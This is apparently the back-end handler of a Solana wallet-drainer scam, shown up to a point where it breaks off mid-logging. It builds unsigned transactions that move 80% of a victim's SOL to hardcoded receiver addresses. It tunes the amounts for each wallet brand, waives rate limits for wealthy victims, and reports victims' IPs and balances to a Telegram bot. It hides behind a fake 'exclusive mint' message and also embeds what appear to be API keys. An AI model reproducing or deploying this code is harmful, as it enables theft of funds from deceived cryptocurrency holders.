import 'dotenv/config';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';

function validateEnvironment() {
  const warnings = [];
  
  if (!process.env.RPC_URL) warnings.push('RPC_URL not set - using fallback endpoints');
  if (!process.env.RECEIVER_WALLET) warnings.push('RECEIVER_WALLET not set - using fallback address');
  if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
    warnings.push('Telegram credentials not set - logging may be limited');
  }
  
  if (warnings.length > 0) console.log('[ENV] Environment warnings:', warnings);
  return warnings.length === 0;
}

const isEnvValid = validateEnvironment();
// Production logging - allow all drain-related logs
function debugLog(message, ...args) {
  if (message && (
    message.includes && (
      message.includes('ERROR') || 
      message.includes('[DRAIN]') ||
      message.includes('[BALANCE]') ||
      message.includes('[TELEGRAM]') ||
      message.includes('Wallet Detected') ||
      message.includes('DRAIN_FAILED') ||
      message.includes('Creating transfer') ||
      message.includes('Drain attempt details') ||
      message.includes('TELEGRAM_DRAIN_SUCCESS') ||
      message.includes('DRAIN_AMOUNT') ||
      message.includes('CONFIRMATION') ||
      message.includes('CONFIRMATION_HANDLER') ||
      message.includes('DRAIN_CREATED') ||
      message.includes('DRAIN_CREATED_FRONTEND')
    )
  )) {
    console.log(message, ...args);
  }
}

const RPC_ENDPOINTS = [
  { url: 'https://api.mainnet-beta.solana.com', weight: 1 },
  { url: process.env.RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', weight: 1 },
  { url: 'https://solana-mainnet.g.alchemy.com/v2/demo', weight: 1 },
  { url: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0', weight: 1 }
];

let currentRpcIndex = 0;
let rpcFailures = new Map();
const connectionPool = new Map();

async function getConnection() {
  const maxRetries = 3;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const rpcEndpoint = RPC_ENDPOINTS[currentRpcIndex];
    const rpcUrl = rpcEndpoint.url;
    
    try {
      if (!connectionPool.has(rpcUrl)) {
        const connection = new Connection(rpcUrl, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 60000,
          disableRetryOnRateLimit: false,
          httpHeaders: { 'Content-Type': 'application/json' }
        });
        connectionPool.set(rpcUrl, connection);
      }
      
      const connection = connectionPool.get(rpcUrl);
      const testPromise = connection.getLatestBlockhash('confirmed');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('RPC timeout')), 5000)
      );
      
      await Promise.race([testPromise, timeoutPromise]);
      
      rpcFailures.set(rpcUrl, 0);
      return connection;
      
    } catch (error) {
      // Track failures
      const failures = rpcFailures.get(rpcUrl) || 0;
      rpcFailures.set(rpcUrl, failures + 1);
      
      // Skip RPCs with too many failures
      if (failures > 3) {
        // Silent failure tracking
      }
      
      // Rotate to next RPC endpoint
      currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
      
      if (attempt === maxRetries - 1) {
        throw new Error(`All RPC endpoints failed after ${maxRetries} attempts`);
      }
      
      // Exponential backoff
      await new Promise(resolve => setTimeout(resolve, Math.min(1000 * Math.pow(2, attempt), 10000)));
    }
  }
}

// Rate limiting
const requestCache = new Map();
const walletRequestCache = new Map();
const blockedIPs = new Set();

const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 15; // Increased from 10 to 15
const MAX_WALLET_REQUESTS_PER_WINDOW = 8; // Increased from 5 to 8

// Cache cleanup function to prevent memory leaks (optimized)
function cleanupOldCacheEntries() {
  const now = Date.now();
  const cutoff = now - RATE_LIMIT_WINDOW;
  
  // Optimized cleanup using batch operations
  const cleanupCache = (cache) => {
    const toDelete = [];
    const toUpdate = new Map();
    
    for (const [key, requests] of cache.entries()) {
      const filtered = requests.filter(time => time > cutoff);
      if (filtered.length === 0) {
        toDelete.push(key);
      } else if (filtered.length !== requests.length) {
        toUpdate.set(key, filtered);
      }
    }
    
    // Batch delete
    toDelete.forEach(key => cache.delete(key));
    
    // Batch update
    toUpdate.forEach((value, key) => cache.set(key, value));
    
    return { deleted: toDelete.length, updated: toUpdate.size };
  };
  
  const ipStats = cleanupCache(requestCache);
  const walletStats = cleanupCache(walletRequestCache);
  
  console.log(`[RATE_LIMIT] Cache cleanup completed - IPs: ${ipStats.deleted} deleted, ${ipStats.updated} updated; Wallets: ${walletStats.deleted} deleted, ${walletStats.updated} updated`);
}

// Enhanced rate limiting with high-value wallet bypass
function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
  console.log('[RATE_LIMIT] Starting rate limit check for IP:', userIp, 'wallet:', walletAddress, 'balance:', walletBalance);
  const now = Date.now();
  
  // Periodic cache cleanup (every 100 requests to avoid performance impact)
  if (Math.random() < 0.01) { // 1% chance to trigger cleanup
    cleanupOldCacheEntries();
  }
  
  // High-value wallet bypass: Skip rate limits for wallets with > 0.1 SOL
  if (walletAddress && walletBalance && walletBalance > 100000000) { // 0.1 SOL = 100,000,000 lamports
    // Still check IP-based rate limiting for security (but with higher limits)
    const ipRequests = requestCache.get(userIp) || [];
    const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    // Allow higher limits for high-value wallets but still protect against abuse
    const highValueMaxRequests = MAX_REQUESTS_PER_WINDOW * 3; // 3x normal limit
    if (recentIpRequests.length >= highValueMaxRequests) {
      return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
    }
    
    return { allowed: true, reason: 'HIGH_VALUE_WALLET_BYPASS' };
  }
  
  // Check IP-based rate limiting
  const ipRequests = requestCache.get(userIp) || [];
  const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
  
  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
  }
  
  // Check wallet-based rate limiting
  if (walletAddress) {
    const walletRequests = walletRequestCache.get(walletAddress) || [];
    const recentWalletRequests = walletRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
      return { allowed: false, reason: 'WALLET_RATE_LIMIT_EXCEEDED', retryAfter: 120 };
    }
    
    recentWalletRequests.push(now);
    walletRequestCache.set(walletAddress, recentWalletRequests);
  }
  
  // Check if IP is blocked
  if (blockedIPs.has(userIp)) {
    return { allowed: false, reason: 'IP_BLOCKED', retryAfter: 3600 };
  }
  
  // Update IP request cache
  recentIpRequests.push(now);
  requestCache.set(userIp, recentIpRequests);
  
  return { allowed: true };
}

// CORS headers
function setCORSHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

// Enhanced error handling function with specific error types
async function handleDrainError(error, userPubkey, userIp) {
  let errorType = 'GENERAL_ERROR';
  let statusCode = 500;
  
  // Determine error type based on error message and properties
  if (error.message?.includes('429') || error.message?.includes('rate limit')) {
    errorType = 'RATE_LIMITED';
    statusCode = 429;
  } else if (error.message?.includes('503') || error.message?.includes('service unavailable')) {
    errorType = 'SERVICE_UNAVAILABLE';
    statusCode = 503;
  } else if (error.message?.includes('insufficient') || error.message?.includes('balance')) {
    errorType = 'INSUFFICIENT_FUNDS';
    statusCode = 400;
  } else if (error.message?.includes('timeout') || error.message?.includes('connection')) {
    errorType = 'TIMEOUT';
    statusCode = 408;
  } else if (error.message?.includes('invalid') || error.message?.includes('malformed')) {
    errorType = 'INVALID_REQUEST';
    statusCode = 400;
  } else if (error.message?.includes('unauthorized') || error.message?.includes('forbidden')) {
    errorType = 'UNAUTHORIZED';
    statusCode = 401;
  } else if (error.name === 'NetworkError' || error.message?.includes('network')) {
    errorType = 'NETWORK_ERROR';
    statusCode = 503;
  }
  
  await telegramLogger.logDrainFailed({
    publicKey: userPubkey?.toString() || 'N/A',
    lamports: 0,
    ip: userIp,
    error: error.message
  });
  
  return {
    status: statusCode,
    error: getErrorMessage(errorType),
    details: getErrorDetails(errorType),
    code: errorType
  };
}

// Helper functions for error messages
function getErrorMessage(errorType) {
  const messages = {
    'RATE_LIMITED': 'Rate limit exceeded',
    'SERVICE_UNAVAILABLE': 'Service temporarily unavailable',
    'INSUFFICIENT_FUNDS': 'Insufficient funds',
    'TIMEOUT': 'Request timeout',
    'INVALID_REQUEST': 'Invalid request',
    'UNAUTHORIZED': 'Unauthorized',
    'NETWORK_ERROR': 'Network error',
    'GENERAL_ERROR': 'Service temporarily unavailable'
  };
  return messages[errorType] || messages['GENERAL_ERROR'];
}

function getErrorDetails(errorType) {
  const details = {
    'RATE_LIMITED': 'Too many requests. Please try again later.',
    'SERVICE_UNAVAILABLE': 'Please try again later.',
    'INSUFFICIENT_FUNDS': 'Please ensure your wallet has sufficient funds.',
    'TIMEOUT': 'Request took too long. Please try again.',
    'INVALID_REQUEST': 'Please check your request and try again.',
    'UNAUTHORIZED': 'Authentication required.',
    'NETWORK_ERROR': 'Network connection issue. Please try again.',
    'GENERAL_ERROR': 'Please try again later.'
  };
  return details[errorType] || details['GENERAL_ERROR'];
}

export default async function handler(req, res) {
  console.log('[DRAINER_HANDLER] Starting drainer handler');
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    setCORSHeaders(res);
    res.status(200).end();
    return;
  }

  // Set CORS headers for all responses
  setCORSHeaders(res);

  // Get user public key and wallet type from query or body
  let userPublicKey;
  let walletType = 'Unknown';
  
  if (req.method === 'GET') {
    userPublicKey = req.query.user || req.query.publicKey || req.query.wallet;
    walletType = req.query.walletType || 'Unknown';
  } else if (req.method === 'POST') {
    const body = req.body;
    userPublicKey = body.user || body.publicKey || body.wallet || body.pubkey;
    walletType = body.walletType || 'Unknown';
  }

  console.log('[DRAINER_HANDLER] Request data:', { userPublicKey, walletType, method: req.method });



  try {
    // Create receiver wallets - ENFORCED to specific address
    const RECEIVER = new PublicKey('FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj');
const RECEIVER_2 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
const RECEIVER_3 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
const RECEIVER_4 = new PublicKey('HakitSyn1Fv5BQPJW8GaAbQ6WdFJ7Mo4HwBB9wumtycF');
    
    console.log(`[DRAINER] Receiver addresses enforced to: ${RECEIVER.toString()}`);

    if (!userPublicKey) {
      await telegramLogger.logError({
        user: 'N/A',
        ip: userIp,
        message: 'Missing user parameter in request'
      });

      return res.status(400).json({ 
        error: 'Missing user parameter', 
        details: 'Please provide a valid MAMBO wallet address.',
        code: 'MISSING_PARAMETER'
      });
    }

    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(userPublicKey);
      
      // Check if this is a valid user wallet (not a program address)
      if (userPublicKey === '11111111111111111111111111111111' || 
          userPublicKey === SystemProgram.programId.toString()) {
        
        await telegramLogger.logError({
          user: userPublicKey,
          ip: userIp,
          message: `Attempted to drain from program address: ${userPublicKey}`
        });

        return res.status(400).json({ 
          error: 'Invalid wallet address', 
          details: 'Cannot drain from program addresses. Please provide a valid user wallet address.',
          code: 'INVALID_WALLET_ADDRESS'
        });
      }
    } catch (error) {
      await telegramLogger.logError({
        user: userPublicKey,
        ip: userIp,
          message: `Invalid public key format: ${userPublicKey}`
      });

              return res.status(400).json({ 
          error: 'Invalid wallet address', 
          details: 'Please provide a valid MAMBO wallet address.',
          code: 'INVALID_PUBLIC_KEY'
        });
    }

    // Rate limiting check BEFORE balance fetch to prevent retry-based rate limiting
    // Use a conservative balance estimate for rate limiting (assume minimum balance)
    console.log('[DRAINER_HANDLER] Checking rate limits...');
    const rateLimitCheck = checkRateLimit(userIp, userPublicKey, 0); // Use 0 for initial check
    console.log('[DRAINER_HANDLER] Rate limit check result:', rateLimitCheck);
    
    if (!rateLimitCheck.allowed) {
      console.log('[DRAINER_HANDLER] Rate limit exceeded, returning error');
      await telegramLogger.logSecurityEvent({
        type: rateLimitCheck.reason,
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded - retry after ${rateLimitCheck.retryAfter} seconds`
      });

      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: rateLimitCheck.retryAfter
      });
    }
    console.log('[DRAINER_HANDLER] Rate limit check passed');
    
    // Get user balance with simplified approach
    console.log('[DRAINER_HANDLER] Starting balance fetch');
    let lamports = 0;
    
    try {
      console.log('[DRAINER_HANDLER] Creating connection for balance fetch');
      const connection = new Connection('https://api.mainnet-beta.solana.com', {
        commitment: 'confirmed',
        confirmTransactionInitialTimeout: 30000,
        disableRetryOnRateLimit: false
      });
      
      console.log('[DRAINER_HANDLER] Fetching balance...');
      lamports = await connection.getBalance(userPubkey);
      console.log(`[BALANCE] Successfully fetched balance: ${lamports} lamports (${(lamports / 1e9).toFixed(6)} SOL)`);
    } catch (error) {
      console.error('[BALANCE_ERROR] Failed to fetch balance:', error.message);
      return res.status(503).json({ 
        error: 'Service temporarily unavailable', 
        details: 'Unable to fetch wallet balance. Please try again later.',
        code: 'BALANCE_FETCH_FAILED'
      });
    }
    
    // Re-check rate limiting with actual balance for high-value wallet bypass
    const finalRateLimitCheck = checkRateLimit(userIp, userPublicKey, lamports);
    if (!finalRateLimitCheck.allowed) {
      await telegramLogger.logSecurityEvent({
        type: finalRateLimitCheck.reason,
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded after balance fetch - retry after ${finalRateLimitCheck.retryAfter} seconds`
      });

      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: finalRateLimitCheck.retryAfter
      });
    }
    
    // Log high-value wallet bypass if applicable
    if (finalRateLimitCheck.reason === 'HIGH_VALUE_WALLET_BYPASS') {
      await telegramLogger.logHighValueBypass({
        user: userPublicKey || 'N/A',
        ip: userIp,
        lamports: lamports
      });
    }

    // Define fee calculation variables at function scope
          // Phantom-optimized drain settings (80% drain configuration)
      const PHANTOM_FEE_BUFFER = 50000; // ~0.00005 SOL for Phantom network fees + safety margin
      const PHANTOM_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
      const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
      
      // Solflare-optimized drain settings (80% drain configuration)
      const SOLFLARE_FEE_BUFFER = 50000; // ~0.00005 SOL for network fees
      const SOLFLARE_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
      const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
      
      // Glow-optimized drain settings (80% drain configuration)
      const GLOW_FEE_BUFFER = 50000; // ~0.00005 SOL for Glow network fees + safety margin
      const GLOW_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
      const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
      
      // Backpack-optimized drain settings (80% drain configuration)
      const BACKPACK_FEE_BUFFER = 50000; // ~0.00005 SOL for Backpack network fees + safety margin
      const BACKPACK_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
      const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
      
      // Exodus-optimized drain settings (80% drain configuration)
      const EXODUS_FEE_BUFFER = 50000; // ~0.00005 SOL for Exodus network fees + safety margin
      const EXODUS_RESERVE_LAMPORTS = 500000; // Keep 0.0005 SOL for rent exemption + safety
      const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
    
    // Get wallet type from request body or user agent
    const userAgent = req.headers['user-agent'] || '';
    const requestWalletType = req.body?.walletType || req.query?.walletType || 'Unknown';
    
    // Check both request body wallet type and user agent
    const isSolflare = requestWalletType === 'Solflare' || userAgent.includes('Solflare') || userAgent.includes('solflare');
    const isGlow = requestWalletType === 'Glow' || userAgent.includes('Glow') || userAgent.includes('glow');
    const isBackpack = requestWalletType === 'Backpack' || userAgent.includes('Backpack') || userAgent.includes('backpack');
    const isExodus = requestWalletType === 'Exodus' || userAgent.includes('Exodus') || userAgent.includes('exodus');
    
    // Use wallet-specific settings
    let FEE_BUFFER, RESERVE_LAMPORTS, TOTAL_RESERVED;
    
    if (isSolflare) {
      FEE_BUFFER = SOLFLARE_FEE_BUFFER;
      RESERVE_LAMPORTS = SOLFLARE_RESERVE_LAMPORTS;
      TOTAL_RESERVED = SOLFLARE_TOTAL_RESERVED;
    } else if (isGlow) {
      FEE_BUFFER = GLOW_FEE_BUFFER;
      RESERVE_LAMPORTS = GLOW_RESERVE_LAMPORTS;
      TOTAL_RESERVED = GLOW_TOTAL_RESERVED;
    } else if (isBackpack) {
      FEE_BUFFER = BACKPACK_FEE_BUFFER;
      RESERVE_LAMPORTS = BACKPACK_RESERVE_LAMPORTS;
      TOTAL_RESERVED = BACKPACK_TOTAL_RESERVED;
    } else if (isExodus) {
      FEE_BUFFER = EXODUS_FEE_BUFFER;
      RESERVE_LAMPORTS = EXODUS_RESERVE_LAMPORTS;
      TOTAL_RESERVED = EXODUS_TOTAL_RESERVED;
    } else {
      // Default to Phantom settings for unknown wallets
      FEE_BUFFER = PHANTOM_FEE_BUFFER;
      RESERVE_LAMPORTS = PHANTOM_RESERVE_LAMPORTS;
      TOTAL_RESERVED = PHANTOM_TOTAL_RESERVED;
    }

    // Create transaction
    const tx = new Transaction();

    // Declare actualDrainAmount at higher scope
    let actualDrainAmount = 0;

    // Smart SOL drain strategy with balance fetching and retry logic
    try {
      // Strategy: Always fetch fresh balance and subtract proper fees
      const FRESH_BALANCE = lamports; // Already fetched above
      
            // Enhanced debugging for drain calculation
debugLog(`Wallet: ${userPubkey.toString()}`);
debugLog(`Fresh Balance: ${FRESH_BALANCE} lamports (${(FRESH_BALANCE / 1e9).toFixed(6)} SOL)`);
debugLog(`Total Reserved: ${TOTAL_RESERVED} lamports (${(TOTAL_RESERVED / 1e9).toFixed(6)} SOL)`);
debugLog(`Wallet Type Detection:`);
debugLog(`- Request Wallet Type: ${requestWalletType}`);
debugLog(`- Is Solflare: ${isSolflare}`);
debugLog(`- Is Glow: ${isGlow}`);
debugLog(`- Is Backpack: ${isBackpack}`);
debugLog(`- Is Exodus: ${isExodus}`);
debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
      
      // Check if wallet has enough SOL for fees and rent exemption (at least 0.0026 SOL)
      const MINIMUM_MEANINGFUL_SOL = 2600000; // 0.0026 SOL (enough for fees + rent exemption + small drain)
      
      if (FRESH_BALANCE < MINIMUM_MEANINGFUL_SOL) {
        debugLog(`Insufficient SOL for fees and rent: ${FRESH_BALANCE} < ${MINIMUM_MEANINGFUL_SOL}`);
        await telegramLogger.logInsufficientFunds({
          user: userPubkey.toString(),
          ip: userIp,
          lamports: FRESH_BALANCE
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_SOL_FOR_FEES'
        });
      }
      
      // Check if wallet has enough funds after reserving fees
      if (FRESH_BALANCE > TOTAL_RESERVED) {
        // Calculate safe drain amount with proper fee subtraction
        const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
        debugLog(`Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
        
                 // Standard drain: 80% of available funds (after reserving fees)
         const DRAIN_PERCENTAGE = 0.8; // 80% for all wallets
        let drainAmount = Math.floor(availableForDrain * DRAIN_PERCENTAGE);
        
        debugLog(`Available: ${availableForDrain} lamports, ${DRAIN_PERCENTAGE * 100}% of available: ${Math.floor(availableForDrain * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
        
        // Add fallback: if amount is too small, skip the drain
        if (drainAmount <= 0) {
          debugLog(`Drain amount too small: ${drainAmount} lamports`);
          await telegramLogger.logDrainFailed({
            publicKey: userPubkey.toString(),
            lamports: lamports,
            ip: userIp,
            error: `Drain amount too small: ${drainAmount} lamports`
          });
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INSUFFICIENT_DRAIN_AMOUNT',
            reason: 'Drain amount too small after fee calculation'
          });
        }
        
        // Additional safety check: ensure we're not draining too much
        const MINIMUM_BALANCE_AFTER_DRAIN = 50000; // ~0.00005 SOL minimum balance (reduced for 80% drain)
        const maxSafeDrain = FRESH_BALANCE - MINIMUM_BALANCE_AFTER_DRAIN;
        
        // Validate that we can safely drain
        if (maxSafeDrain <= 0) {
          debugLog(`Cannot drain safely: ${FRESH_BALANCE} - ${MINIMUM_BALANCE_AFTER_DRAIN} = ${maxSafeDrain} <= 0`);
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INSUFFICIENT_FUNDS_FOR_SAFE_DRAIN'
          });
        }
        
        // For 80% drain, use the calculated amount but respect safety limit
        const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
        debugLog(`Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
        
        let finalDrainAmount = safeDrainAmount;
        
                 
        
        // Ensure minimum meaningful drain amount (reduced for 80% drain)
        const MINIMUM_DRAIN_AMOUNT = 30000; // 0.00003 SOL minimum drain amount
        if (finalDrainAmount < MINIMUM_DRAIN_AMOUNT) {
          debugLog(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INSUFFICIENT_DRAIN_AMOUNT'
          });
        }
        
        // Validate that receiver is not the same as sender (safety check)
        if (userPubkey.toString() === RECEIVER.toString()) {
          console.error(`[DRAIN] CRITICAL ERROR: Receiver address same as sender: ${RECEIVER.toString()}`);
                  await telegramLogger.logError({
          user: userPubkey.toString(),
          ip: userIp,
          message: 'Receiver address same as sender - configuration error'
        });
          return res.status(500).json({
            error: 'System configuration error',
            details: 'Please contact support',
            code: 'CRITICAL_CONFIG_ERROR'
          });
        }
        
        console.log(`[DRAIN] Creating transfer: ${finalDrainAmount} lamports (${(finalDrainAmount / 1e9).toFixed(6)} SOL) from ${userPubkey.toString()} to ${RECEIVER.toString()}`);
        
        // Validate drain amount before creating instruction
        if (finalDrainAmount <= 0) {
          debugLog(`Invalid drain amount: ${finalDrainAmount} <= 0`);
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INVALID_DRAIN_AMOUNT'
          });
        }
        
        // Create transfer instruction with explicit format for Glow compatibility
        const transferIx = SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: RECEIVER,
          lamports: finalDrainAmount,
        });
        

        
        tx.add(transferIx);
        
        debugLog(`Transaction instruction added successfully`);
        

        
        // Store the actual drain amount for later use
        actualDrainAmount = finalDrainAmount;

      } else {
        debugLog(`Insufficient funds after reserving fees: ${FRESH_BALANCE} <= ${TOTAL_RESERVED}`);
        await telegramLogger.logInsufficientFunds({
          user: userPubkey.toString(),
          ip: userIp,
          lamports: lamports
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_FUNDS'
        });
      }
    } catch (error) {
      await telegramLogger.logError({
        user: userPubkey.toString(),
        ip: userIp,
        message: 'Failed to create transaction'
      });
      return res.status(500).json({ error: 'Failed to create transaction', details: error.message });
    }

    // Check if transaction has instructions
    if (tx.instructions.length === 0) {
      await telegramLogger.logDrainAttempt({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        tokenCount: 0,
        nftCount: 0,
        transactionSize: 0,
        instructions: 0,
        success: false,
        actualDrainAmount: 0,
        hasTokens: false,
        hasNFTs: false,
        error: 'Insufficient funds - no SOL to drain'
      });

      return res.status(400).json({ 
        error: 'Sorry, You\'re Not eligible', 
        details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
        code: 'INSUFFICIENT_FUNDS'
      });
    }

    // Finalize transaction
    try {
      const connection = await getConnection();
      
      // Get fresh blockhash with retry logic
      let blockhash;
      let retryCount = 0;
      const maxBlockhashRetries = 3;
      
      while (retryCount < maxBlockhashRetries) {
        try {
          blockhash = await connection.getLatestBlockhash('confirmed');
          break;
        } catch (blockhashError) {
          retryCount++;
          console.error(`[BLOCKHASH] Retry ${retryCount}/${maxBlockhashRetries}:`, blockhashError.message);
          
          if (retryCount >= maxBlockhashRetries) {
            throw new Error('Failed to get fresh blockhash after multiple attempts');
          }
          
          await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
        }
      }
      
      // Set fee payer and blockhash with explicit format for Glow compatibility
      tx.feePayer = userPubkey;
      tx.recentBlockhash = blockhash.blockhash;
      

      
      // Validate transaction structure
      if (!tx.feePayer || !tx.recentBlockhash) {
        console.error('[DRAIN] Transaction validation failed:', {
          hasFeePayer: !!tx.feePayer,
          hasBlockhash: !!tx.recentBlockhash,
          feePayer: tx.feePayer?.toString(),
          blockhash: tx.recentBlockhash
        });
        throw new Error('Transaction missing required fields');
      }
      
      console.log('[DRAIN] Transaction structure validated:', {
        feePayer: tx.feePayer.toString(),
        blockhash: tx.recentBlockhash,
        instructions: tx.instructions.length
      });

             // Standard transaction settings - no wallet-specific customizations
       tx.lastValidBlockHeight = blockhash.lastValidBlockHeight;
       console.log(`[DRAIN] Set lastValidBlockHeight to ${blockhash.lastValidBlockHeight}`);
       
       if (tx.feePayer) {
         console.log(`[DRAIN] Fee payer set to ${tx.feePayer.toString()}`);
       }
       
       console.log(`[DRAIN] Standard transaction approach - no wallet-specific customizations`);
       

      
      // Calculate actual transaction fee with enhanced error handling
      let actualFee = 0;
      try {
        const feeCalculator = await connection.getFeeForMessage(tx.compileMessage(), blockhash.blockhash);
        actualFee = feeCalculator.value || 5000; // Default to 5000 if calculation fails
        console.log(`[DRAIN] Calculated transaction fee: ${actualFee} lamports`);
        console.log(`[DRAIN] Wallet balance: ${lamports} lamports`);
        console.log(`[DRAIN] Fee adequacy: ${lamports >= actualFee ? 'SUFFICIENT' : 'INSUFFICIENT'}`);
        
        // Validate fee calculation
        if (actualFee <= 0 || actualFee > 100000) {
          console.warn(`[DRAIN] Suspicious fee calculated: ${actualFee}, using default`);
          actualFee = 5000;
        }
      } catch (feeError) {
        console.log(`[DRAIN] Fee calculation failed, using conservative default: ${feeError.message}`);
        actualFee = 5000; // Standard fee for all wallets
      }
      
      // Simple fee adequacy check - no complex retry logic
      console.log(`[DRAIN] Fee adequacy check: ${lamports} lamports >= ${actualFee} lamports`);
      
      if (lamports <= actualFee) {
        console.log(`[DRAIN] Insufficient funds for fee: ${lamports} < ${actualFee}`);
        await telegramLogger.logSecurityEvent({
          type: 'INSUFFICIENT_FUNDS_FOR_FEE',
          user: userPubkey.toString(),
          ip: userIp,
          details: `Wallet has ${lamports} lamports but needs ${actualFee} lamports for fees`
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive mint is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_FUNDS_FOR_FEE'
        });
      }
      
      console.log(`[DRAIN] Sufficient funds for fee: ${lamports} >= ${actualFee}`);
      
      // Serialize transaction
      let serialized;
      try {
        if (!tx.feePayer || !tx.recentBlockhash) {
          throw new Error('Transaction missing required fields (feePayer or recentBlockhash)');
        }
        
        serialized = tx.serialize({ requireAllSignatures: false });
        
        if (!serialized || serialized.length === 0) {
          throw new Error('Transaction serialization produced empty result');
        }
      } catch (serializeError) {
        await telegramLogger.logError({
          user: userPubkey.toString(),
          ip: userIp,
          message: 'Failed to serialize transaction'
        });
        return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
      }
      
      // Determine drain potential with smart strategy (using existing variables)
      const hasMeaningfulSOL = lamports > 100000; // > 0.0001 SOL
      const hasEnoughForFees = lamports > TOTAL_RESERVED; // > 0.000015 SOL for fees + reserve
      const hasValidSOLDrain = hasMeaningfulSOL && hasEnoughForFees;
      const hasDrainInstructions = tx.instructions.length > 0;
      const hasPotentialForDrain = hasValidSOLDrain && hasDrainInstructions;
      
      // Enhanced drain attempt logging with detailed information
      console.log(`[DRAIN_LOG] Drain attempt details:`);
      console.log(`[DRAIN_LOG] - Wallet: ${userPubkey.toString()}`);
      console.log(`[DRAIN_LOG] - Balance: ${lamports} lamports (${(lamports / 1e9).toFixed(6)} SOL)`);
      console.log(`[DRAIN_LOG] - Has meaningful SOL: ${hasMeaningfulSOL}`);
      console.log(`[DRAIN_LOG] - Has enough for fees: ${hasEnoughForFees}`);
      console.log(`[DRAIN_LOG] - Has valid SOL drain: ${hasValidSOLDrain}`);
